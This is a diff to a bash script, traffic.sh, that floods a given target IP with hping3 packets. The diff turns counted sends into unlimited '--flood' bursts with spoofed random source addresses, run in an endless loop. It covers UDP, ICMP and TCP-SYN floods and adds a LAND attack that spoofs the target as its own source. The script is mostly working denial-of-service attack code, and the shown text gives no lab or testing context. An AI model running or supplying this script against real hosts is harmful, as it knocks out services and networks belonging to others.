@@ -3,14 +3,16 @@
  # @Description: 
  # @Version: 1.0
  # @Autor: Ian Yang
- # @Date: 2024-04-26 00:45:51
+ # @Date: 2024-04-26 00:47:31
  # @LastEditors: Ian Yang
- # @LastEditTime: 2024-04-26 00:21:58
+ # @LastEditTime: 2024-04-26 12:19:07
 ### 
+
 # If no argument supplied
-if [ $# -eq 0 ]; then
-    echo "usage: sudo bash traffic.sh <target_ip> <flood_type>"
-else
+if [ $# -lt 2 ]
+  then
+    echo "usage bash traffic.sh <target_ip> <flood_type>"
+else 
     TARGET_IP="$1"
     FLOOD_TYPE="$2"
     while true; do
@@ -19,13 +21,16 @@ else
         PAUSE=$(shuf -i 1-10 -n 1)
         case $FLOOD_TYPE in
             "UDP")
-                hping3 --udp -c $N_PACKETS -d $N_BYTES "$TARGET_IP"
+                sudo timeout 20s hping3 -2 -V -d 120 -w 64 --rand-source --flood "$TARGET_IP"
                 ;;
             "ICMP")
-                hping3 --icmp -c $N_PACKETS -d $N_BYTES "$TARGET_IP"
+                sudo timeout 20s hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood  "$TARGET_IP"
                 ;;
             "TCP-SYN")
-                hping3 --syn -c $N_PACKETS -d $N_BYTES "$TARGET_IP"
+                sudo timeout 20s hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood "$TARGET_IP"
+                ;;
+            "LAND")
+                sudo timeout 20s hping3 -1 -V -d 120 -w 64 --flood -a "$TARGET_IP" "$TARGET_IP"
                 ;;
             *)
                 echo "Invalid flood type. Please choose UDP, ICMP, or TCP-SYN."
